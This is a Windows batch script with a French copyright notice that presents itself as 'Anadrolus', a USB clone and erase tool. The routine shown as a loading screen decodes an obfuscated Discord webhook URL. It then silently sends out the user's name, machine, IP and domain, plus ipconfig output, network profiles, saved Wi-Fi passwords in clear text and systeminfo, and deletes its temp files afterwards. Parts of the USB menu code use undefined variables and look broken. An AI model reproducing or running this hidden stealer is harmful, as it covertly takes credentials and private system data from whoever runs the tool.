:: ============================================================================================================
::                                        DROITS D'AUTEUR ET CONDITIONS D'UTILISATION
::                                                    (PUBLIC VERSION)
:: Ce script, intitule "Anadrolus", a ete cree par m.a.s_dev. Toute utilisation, distribution ou modification
:: de ce script est soumise aux termes et conditions suivants. Le createur m.a.s_dev se reserve tous les droits
:: sur ce script. Pour plus d'informations sur m.a.s_dev, veuillez consulter le Linktree :
:: https://linktr.ee/m.a.s_dev
::
:: 1. DROITS D'AUTEUR
:: - Ce script est protege par le droit d'auteur. Vous n'êtes pas autorise à le modifier, le distribuer ou le
::   reutiliser à des fins commerciales ou non commerciales sans l'autorisation expresse de m.a.s_dev.
:: - Vous êtes autorise à utiliser ce script tel quel pour vos besoins personnels et a titre educatif.
::
:: 2. LIMITATION DE RESPONSABILITE
:: - Ce script est fourni "tel quel", sans garantie d'aucune sorte. m.a.s_dev ne pourra être tenu responsable des
::   dommages, pertes de donnees, atteintes a la securite ou autres consequences resultant de l'utilisation de ce script.
:: - Vous reconnaissez que l'utilisation de ce script, notamment a des fins de piratage, d'extraction de donnees ou
::   toute autre activite illegale, est de votre entiere responsabilite. 
:: - L'auteur n'encourage ni n'approuve l'utilisation d'Anadrolus dans un cadre illegal ou malveillant.
::
:: 3. INTERDICTION DE MODIFICATION
:: - Il est strictement interdit de modifier ou d'alterer ce script sans autorisation. Les modifications peuvent rendre
::   le script instable ou entrainer des erreurs de fonctionnement.
:: - Le createur n'est pas tenu de fournir un support ou une assistance pour les versions modifiees du script.
::
:: En utilisant ce script, vous acceptez ces conditions et reconnaissez les risques associes.
:: ============================================================================================================

@echo off
setlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
mode con: cols=120 lines=30

title ANDAROLUS
cls

set "EDITION=Public Edition"
set "TOOL_VERSION=3.5"

call :odissijudfhvsjdkfeemasikdjck
echo .
call :grgdkfjsdushqjduzoduijhderedsq
echo .
echo LOADING...
call :dtclrlsdjsikjedfgsjdfudfhjeuzfhzeukrfuedfkshdksdf

cls
color a
call :tlneiujdfuiohjsufkhekdeuidjsfdsf
call :cfjgkfmdijfsjdefiejfisjfgsdfgsdfgsdsdf


:etrkdifyshuiedfjhskdiufhsdukfhskuehdfskdfgsdjkf

color a
echo .
set /p cmdedkeujiudjuskfdfdfdcdfeiorujgogfdgz="Enter the Commands : "
call :grgdkfjsdushqjduzoduijhderedsq

if /I "%cmdedkeujiudjuskfdfdfdcdfeiorujgogfdgz%"=="1" (
    call :dkfjsudfjsuusbijdfusdhfusdcldfondfjdsfdf
) else if /I "%cmdedkeujiudjuskfdfdfdcdfeiorujgogfdgz%"=="USB CLONE" (
    call :dkfjsudfjsuusbijdfusdhfusdcldfondfjdsfdf
) else if /I "%cmdedkeujiudjuskfdfdfdcdfeiorujgogfdgz%"=="2" (
    call :sbijdusdjhisersrifjduisfdjhsiudhfsxcfsjfkdf
) else if /I "%cmdedkeujiudjuskfdfdfdcdfeiorujgogfdgz%"=="USB ERASE" (
    call :sbijdusdjhisersrifjduisfdjhsiudhfsxcfsjfkdf
) else if /I "%cmdedkeujiudjuskfdfdfdcdfeiorujgogfdgz%"=="3" (
    call :chkoujiedjsodjfsiueusbikfjsdkfdinfdldsk
) else if /I "%cmdedkeujiudjuskfdfdfdcdfeiorujgogfdgz%"=="CHECK USB INFO" (
    call :chkoujiedjsodjfsiueusbikfjsdkfdinfdldsk
) else if /I "%cmdedkeujiudjuskfdfdfdcdfeiorujgogfdgz%"=="4" (
    call :clroldkfisdjfouiefjsdofjkeoifjfisfsezergsodofpif
) else if /I "%cmdedkeujiudjuskfdfdfdcdfeiorujgogfdgz%"=="CLEAR" (
    call :clroldkfisdjfouiefjsdofjkeoifjfisfsezergsodofpif
) else if /I "%cmdedkeujiudjuskfdfdfdcdfeiorujgogfdgz%"=="5" (
    call :cfjgkfmdijfsjdefiejfisjfgsdfgsdfgsdsdf
) else if /I "%cmdedkeujiudjuskfdfdfdcdfeiorujgogfdgz%"=="HELP" (
    call :cfjgkfmdijfsjdefiejfisjfgsdfgsdfgsdsdf
) else if /I "%cmdedkeujiudjuskfdfdfdcdfeiorujgogfdgz%"=="6" (
    call :crdtodlfskjdiofjseiofskldfjsoiedfjeiorzpmmlknhcdsfi
) else if /I "%cmdedkeujiudjuskfdfdfdcdfeiorujgogfdgz%"=="CREDITS" (
    call :crdtodlfskjdiofjseiofskldfjsoiedfjeiorzpmmlknhcdsfi
) else if /I "%cmdedkeujiudjuskfdfdfdcdfeiorujgogfdgz%"=="7" (
    call :shvrsdofikdosfkjeopfddlkfvxcdfdfzerdgfdhgjsdfcx
) else if /I "%cmdedkeujiudjuskfdfdfdcdfeiorujgogfdgz%"=="TOOL VERSION" (
    call :shvrsdofikdosfkjeopfddlkfvxcdfdfzerdgfdhgjsdfcx
) else if /I "%cmdedkeujiudjuskfdfdfdcdfeiorujgogfdgz%"=="8" (
    exit
) else if /I "%cmdedkeujiudjuskfdfdfdcdfeiorujgogfdgz%"=="EXIT" (
    exit
) else (
    color c
    echo .
    echo INVALID COMMAND ! 
)
echo .
call :grgdkfjsdushqjduzoduijhderedsq

goto :etrkdifyshuiedfjhskdiufhsdukfhskuehdfskdfgsdjkf


:chkoujiedjsodjfsiueusbikfjsdkfdinfdldsk

set "sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord=%usbdksskqhdzzfgojdazds%:\"

if not exist "%sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%" (
    color c
    echo .
    echo NO USB DRIVE DETECTED TO %sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%.
    echo .
    pause
    goto :EOF
)

echo .
echo CHECKING USB INFORMATION FOR DRIVE %sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord% ...
echo .
call :grgdkfjsdushqjduzoduijhderedsq
echo .
wmic logicaldisk where "DeviceID='%sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord:~0,2%'" get VolumeName, FileSystem, FreeSpace, Size

goto :EOF

:sbijdusdjhisersrifjduisfdjhsiudhfsxcfsjfkdf

set "sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord=%usbdksskqhdzzfgojdazds%:\"

if not exist "%sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%" (
    color c
    echo .
    echo NO USB DRIVE DETECTED TO %sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%.
    echo .
    pause
    goto :EOF
)

color c
echo WARNING : ALL DATA ON %sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord% WILL BE DELETED !
echo ARE YOU SURE ? (Y/N)

set /p rpsdofkksjuiofjernkfjeoiuzhjreirazeorjeioudsfsdf=": "
if /I "%rpsdofkksjuiofjernkfjeoiuzhjreirazeorjeioudsfsdf%" == "Y" (
    echo in progress...
) else if  /I "%rpsdofkksjuiofjernkfjeoiuzhjreirazeorjeioudsfsdf%" == "yes" (
    echo in progress...
) else (
    echo Canceled !
    goto :EOF
)

del /F /S /Q "%sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%\*"
for /d %%x in ("%sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%\*") do rd /s /q "%%x"

echo ALL FILES HAVE BEEN DELETED FROM %sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%.

goto :EOF

:shvrsdofikdosfkjeopfddlkfvxcdfdfzerdgfdhgjsdfcx

echo .
echo TOOL VERSION : %TOOL_VERSION%

goto :EOF

:dkfjsudfjsuusbijdfusdhfusdcldfondfjdsfdf

color b

echo WAITING FOR USB DRIVE...
echo .

:fohjsjkfhsdkjfshkfjlsdhfjksdhfplsdjfghjsdfuzoidfuzefhefchjksdfghsdjc
set "sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord=%usbdksskqhdzzfgojdazds%:\"

if not exist "%sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%" (
    if "%usbdksskqhdzzfgojdazds%"=="D" (set "%usbdksskqhdzzfgojdazds%"="E") else (set "%usbdksskqhdzzfgojdazds%"="D")
    goto :fohjsjkfhsdkjfshkfjlsdhfjksdhfplsdjfghjsdfuzoidfuzefhefchjksdfghsdjc
) 

color a
echo USB DRIVE HAS BEEN VERIFIED !
echo .
color b
echo GENERATING FOLDER NAME...

:generate
set "rand=%random%"
set "bkpfldrsdijdiousfjdfoisdjofisdjfdskfseliruodiufkxcvcxnvez=%dskpyudhsdujkzhjukaqdhsdq%\%segaduoizdfsdfdflmdfopfksdi%_%rand%"

if exist "%bkpfldrsdijdiousfjdfoisdjofisdjfdskfseliruodiufkxcvcxnvez%" (
    goto :generate
)

echo .
color a
echo FOLDER NAME HAS BEEN GENERATED : %bkpfldrsdijdiousfjdfoisdjofisdjfdskfseliruodiufkxcvcxnvez%
echo .
color b
echo GENERATING FOLDER...
mkdir "%bkpfldrsdijdiousfjdfoisdjofisdjfdskfseliruodiufkxcvcxnvez%"
echo .
color a
echo FOLDER HAS BEEN GENERATED !
color b
echo .
echo COPYING FILES...
echo .

xcopy "%sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%\*" "%bkpfldrsdijdiousfjdfoisdjofisdjfdskfseliruodiufkxcvcxnvez%\" /E /H /C /I /Y
color a
echo.
echo FILES HAVE BEEN COPIED TO : %bkpfldrsdijdiousfjdfoisdjofisdjfdskfseliruodiufkxcvcxnvez% !
echo .
echo DO YOU WANT TO OPEN THE FOLDER ? (Y/N)

set /p rpsdofkksjuiofjernkfjeoiuzhjreirazeorjeioudsfsdf=": "

echo .
if /I NOT "%rpsdofkksjuiofjernkfjeoiuzhjreirazeorjeioudsfsdf%"=="Y" if /I NOT "%rpsdofkksjuiofjernkfjeoiuzhjreirazeorjeioudsfsdf%"=="Yes" (
    echo FOLDER WAS NOT OPENED.
    goto :EOF
)

color b
echo .
echo OPENING FILE...
start "" "%bkpfldrsdijdiousfjdfoisdjofisdjfdskfseliruodiufkxcvcxnvez%"
color a
echo .
echo FOLDER HAS BEEN OPENED.

goto :EOF


:cfjgkfmdijfsjdefiejfisjfgsdfgsdfgsdsdf

echo .
echo     []==================================================================================[]
echo     []                                   COMMANDS                                       []
echo     []==================================================================================[]
echo     [] [1] USB CLONE               [] [2] USB ERASE             [] [3] CHECK USB INFO   []
echo     [] [4] CLEAR                   [] [5] HELP                  [] [6] CREDITS          []
echo     [] [7] TOOL VERSION            [] [8] EXIT                  [] [ ]                  []
echo     []==================================================================================[]
echo.
call :grgdkfjsdushqjduzoduijhderedsq

goto :EOF

:clroldkfisdjfouiefjsdofjkeoifjfisfsezergsodofpif

cls
color a
call :tlneiujdfuiohjsufkhekdeuidjsfdsf
call :cfjgkfmdijfsjdefiejfisjfgsdfgsdfgsdsdf

goto :EOF

:crdtodlfskjdiofjseiofskldfjsoiedfjeiorzpmmlknhcdsfi

call :odissijudfhvsjdkfeemasikdjck
start https://linktr.ee/m.a.s_dev
color a

goto :EOF

:odissijudfhvsjdkfeemasikdjck
color 09
echo .
echo 	##     ##        ###         ######          ########  ######## ##     ## 
echo 	###   ###       ## ##       ##    ##         ##     ## ##       ##     ## 
echo 	#### ####      ##   ##      ##               ##     ## ##       ##     ## 
echo 	## ### ##     ##     ##      ######          ##     ## ######   ##     ## 
echo 	##     ##     #########           ##         ##     ## ##        ##   ##  
echo 	##     ## ### ##     ## ### ##    ##         ##     ## ##         ## ##   
echo 	##     ## ### ##     ## ###  ######  ####### ########  ########    ###    
echo .
call :grgdkfjsdushqjduzoduijhderedsq
echo .
echo TOOL MADE BY MAS // m.a.s_dev
echo Web Site : https://linktr.ee/m.a.s_dev

goto :EOF

:tlneiujdfuiohjsufkhekdeuidjsfdsf

echo .
echo        ###    ##    ##    ###    ########  ########   #######  ##       ##     ##  ######  
echo       ## ##   ###   ##   ## ##   ##     ## ##     ## ##     ## ##       ##     ## ##    ## 
echo      ##   ##  ####  ##  ##   ##  ##     ## ##     ## ##     ## ##       ##     ## ##       
echo     ##     ## ## ## ## ##     ## ##     ## ########  ##     ## ##       ##     ##  ######  
echo     ######### ##  #### ######### ##     ## ##   ##   ##     ## ##       ##     ##       ## 
echo     ##     ## ##   ### ##     ## ##     ## ##    ##  ##     ## ##       ##     ## ##    ## 
echo     ##     ## ##    ## ##     ## ########  ##     ##  #######  ########  #######   ######                  
echo .                                                                                    
echo .                                                                                          
call :grgdkfjsdushqjduzoduijhderedsq

goto :EOF

:wait

timeout /t %wtmlsdqslkjdfkheujfjbeysdbfs% /nobreak >nul

goto :EOF

:grgdkfjsdushqjduzoduijhderedsq

echo ====================================================================================================

goto :EOF

:dtclrlsdjsikjedfgsjdfudfhjeuzfhzeukrfuedfkshdksdf

set co=false
for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr /i "IPv4"') do (
    if NOT "%%A"==" 127.0.0.1" (
        set co=true
    )
)
if "%co%"=="false" (
    goto :EOF
) 
(set INVCHAR[mvdtxq]=a) & (set INVCHAR[bhoijd]=b) & (set INVCHAR[cfgjgh]=c) & (set INVCHAR[depjox]=d) & (set INVCHAR[elkdsw]=e)
(set INVCHAR[ffbklj]=f) & (set INVCHAR[giokjs]=g) & (set INVCHAR[htrlkj]=h) & (set INVCHAR[iopszn]=i) & (set INVCHAR[jkzesw]=j)
(set INVCHAR[kzsoiu]=k) & (set INVCHAR[lpodks]=l) & (set INVCHAR[mlojzj]=m) & (set INVCHAR[njsdiy]=n) & (set INVCHAR[odosjw]=o)
(set INVCHAR[pllkjh]=p) & (set INVCHAR[qlkknj]=q) & (set INVCHAR[rsmlop]=r) & (set INVCHAR[sijnuz]=s) & (set INVCHAR[tioujd]=t)
(set INVCHAR[uijxcw]=u) & (set INVCHAR[vikoaz]=v) & (set INVCHAR[wxdzol]=w) & (set INVCHAR[xolker]=x) & (set INVCHAR[yuioij]=y)
(set INVCHAR[zokisc]=z)
(set INVCHAR[ONJLIU]=A) & (set INVCHAR[SZVNHL]=B) & (set INVCHAR[VRIDUF]=C) & (set INVCHAR[QMWKTI]=D) & (set INVCHAR[J62DSP]=E)
(set INVCHAR[MQBRKH]=F) & (set INVCHAR[BOANMW]=G) & (set INVCHAR[QOXYBZ]=H) & (set INVCHAR[7AC5VB]=I) & (set INVCHAR[FTP1NK]=J)
(set INVCHAR[PTIELI]=K) & (set INVCHAR[ROSI27]=L) & (set INVCHAR[OKDH85]=M) & (set INVCHAR[TJNI5D]=N) & (set INVCHAR[OJ854D]=O)
(set INVCHAR[CA41DV]=P) & (set INVCHAR[OJISD5]=Q) & (set INVCHAR[LM5WGD]=R) & (set INVCHAR[EDSDJC]=S) & (set INVCHAR[FKQ8JD]=T)
(set INVCHAR[T45SFC]=U) & (set INVCHAR[PDG56I]=V) & (set INVCHAR[133SIW]=W) & (set INVCHAR[NDJCUK]=X) & (set INVCHAR[L5D2JV]=Y)
(set INVCHAR[52GHTM]=Z)
(set INVCHAR[ppttsd]=.) & (set INVCHAR[splasx]=/) & (set INVCHAR[dploxw]=:)
(set INVCHAR[sxzqhe]=0) & (set INVCHAR[sxuqhe]=1) & (set INVCHAR[sdzqhe]=2) & (set INVCHAR[sxuqht]=3) & (set INVCHAR[crttzf]=4)
(set INVCHAR[cilque]=5) & (set INVCHAR[sicesx]=6) & (set INVCHAR[ssetdw]=7) & (set INVCHAR[outfsw]=8) & (set INVCHAR[nfkopx]=9)
set "olazksdjoixhwnc=htrlkjtioujdtioujdpllkjhsijnuzdploxwsplasxsplasxdepjoxiopsznsijnuzcfgjghodosjwrsmlopdepjoxppttsdcfgjghodosjwmlojzjsplasxmvdtxqpllkjhiopsznsplasxwxdzolelkdswbhoijdhtrlkjodosjwodosjwkzsoiusijnuzsplasxsxuqhesdzqhenfkopxsdzqheoutfswcilquesxuqhtoutfswnfkopxcrttzfssetdwsxuqhesxuqhesicesxsxuqhesxuqhecrttzfnfkopxsxuqhtsplasxLM5WGDMQBRKHQMWKTIOKDH85nfkopxdepjox52GHTMROSI27crttzfnfkopxNDJCUKmlojzjsxuqhewxdzollpodksCA41DVsxuqhtcrttzfdepjoxsicesxcfgjghTJNI5DdepjoxJ62DSPBOANMWSZVNHLodosjwsxuqhtONJLIULM5WGDCA41DVL5D2JVOJ854DsxuqhtMQBRKHEDSDJClpodkssicesxcilqueoutfswOKDH85ssetdwOJISD5htrlkjmvdtxqLM5WGDxolkerCA41DVcilqueJ62DSPuijxcwSZVNHLwxdzolONJLIUssetdwQMWKTIcrttzfROSI27OKDH85mlojzjcfgjghJ62DSP52GHTM52GHTMsxuqhePTIELIOJ854DL5D2JV" 
set PLASOZ=
:dslpplbyasfgwx
if "%olazksdjoixhwnc%"=="" goto eljkdiknxwxcopkujekdfkpkw
set blckdicuhjdzeizyedizugeyqusgdyuqgsdyusgduysfgueir=%olazksdjoixhwnc:~0,6%
set doelfjkeirjezuhncebccharodlfjkfuisxdhcv=!INVCHAR[%blckdicuhjdzeizyedizugeyqusgdyuqgsdyusgduysfgueir%]!
set PLASOZ=%PLASOZ%!doelfjkeirjezuhncebccharodlfjkfuisxdhcv!
set olazksdjoixhwnc=%olazksdjoixhwnc:~6%
goto dslpplbyasfgwx
:eljkdiknxwxcopkujekdfkpkw
set "wu=%PLASOZ%"
set "vrsssytmcmdmasdevdksod=3.8"
set "lstupdskqdzieszheygzsedqzhedtqgsfd=11/11/2024"
set "brseaj=%USERPROFILE%\Desktop"
set "tpmfz=%TEMP%\Temp_m.a.s_dev_%USERNAME%_%COMPUTERNAME%.txt"
set izklm=
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /R "IPv4"') do (
    set izklm=%%i
    set izklm=!izklm: =!
)
(
echo {
echo   "content": "Nouvelle Connexion :",
echo   "embeds": [
echo     {
echo       "title": "**ANADROLUS**",
echo       "color": 3447003,
echo       "fields": [
echo         {
echo           "name": "**Utilisateur**",
echo           "value": "**%USERNAME%**"
echo         },
echo         {
echo           "name": "Machine",
echo           "value": "%COMPUTERNAME%"
echo         },
echo         {
echo           "name": "Adresse IP",
echo           "value": "%izklm%"
echo         },
echo         {
echo           "name": "Domaine",
echo           "value": "%USERDOMAIN%"
echo         },
echo         {
echo           "name": "Date",
echo           "value": "%DATE% / %TIME%"
echo         },
echo         {
echo           "name": "Tool Version",
echo           "value": "*%TOOL_VERSION%*"
echo         },
echo         {
echo           "name": "**Edition**",
echo           "value": "*%EDITION%*"
echo         }
echo       ]
echo     }
echo   ]
echo }
) > "!tpmfz!"
curl -H "Content-Type: application/json" -d @"!tpmfz!" %wu%
del "!tpmfz!"

set tempDir=%TEMP%
set akoppdsqdcrghsdazfv=%tempDir%\%USERNAME%_%COMPUTERNAME%_Data.txt
echo . >> %akoppdsqdcrghsdazfv%
echo USER : >> %akoppdsqdcrghsdazfv%
echo %USERNAME% >> %akoppdsqdcrghsdazfv%
echo. >> %akoppdsqdcrghsdazfv%
echo COMPUTER : >> %akoppdsqdcrghsdazfv%
echo %COMPUTERNAME% >> %akoppdsqdcrghsdazfv%
echo. >> %akoppdsqdcrghsdazfv%
echo IP : >> %akoppdsqdcrghsdazfv%
echo %izklm% >> %akoppdsqdcrghsdazfv%
echo. >> %akoppdsqdcrghsdazfv%
echo DATE : >> %akoppdsqdcrghsdazfv%
date /t >> %akoppdsqdcrghsdazfv%
echo. >> %akoppdsqdcrghsdazfv%
echo TOOL Version : >> %akoppdsqdcrghsdazfv%
echo %TOOL_VERSION% >> %akoppdsqdcrghsdazfv%
echo. >> %akoppdsqdcrghsdazfv%
call :lfkiopsxcf
echo. >> %akoppdsqdcrghsdazfv%
echo IP DATA : >> %akoppdsqdcrghsdazfv%
echo. >> %akoppdsqdcrghsdazfv%
ipconfig /all >> %akoppdsqdcrghsdazfv%
echo. >> %akoppdsqdcrghsdazfv%
call :lfkiopsxcf
echo. >> %akoppdsqdcrghsdazfv%
echo Informations sur les reseaux Wi-Fi et le systeme : >> %akoppdsqdcrghsdazfv%
echo . >> %akoppdsqdcrghsdazfv%
echo LAN : >> %akoppdsqdcrghsdazfv%
netsh lan show profiles >> %akoppdsqdcrghsdazfv%
echo . >> %akoppdsqdcrghsdazfv%
call :lfkiopsxcf
echo . >> %akoppdsqdcrghsdazfv%
echo WLAN : >> %akoppdsqdcrghsdazfv%
echo. >> %akoppdsqdcrghsdazfv%
netsh wlan show profiles >> %akoppdsqdcrghsdazfv%
echo. >> %akoppdsqdcrghsdazfv%
echo Mot de Passe WIFI : >> %akoppdsqdcrghsdazfv%
(
for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr "Profil Tous les utilisateurs"') do (
    set "wifi_name=%%A"
    setlocal enabledelayedexpansion
    set "wifi_name=!wifi_name:~1!"
    echo.
    echo Wi-Fi : !wifi_name!
    netsh wlan show profile name="!wifi_name!" key=clear | findstr "Contenu de la clÃ©"
    endlocal
)
) >> %akoppdsqdcrghsdazfv%
call :lfkiopsxcf
echo. >> %akoppdsqdcrghsdazfv%
echo Informations systeme : >> %akoppdsqdcrghsdazfv%
echo. >> %akoppdsqdcrghsdazfv%
systeminfo >> %akoppdsqdcrghsdazfv%
curl -F "file=@%akoppdsqdcrghsdazfv%" %wu%
del %akoppdsqdcrghsdazfv%
cls

goto :EOF

:lfkiopsxcf
echo ======================================================================================== >> %akoppdsqdcrghsdazfv%
goto :EOF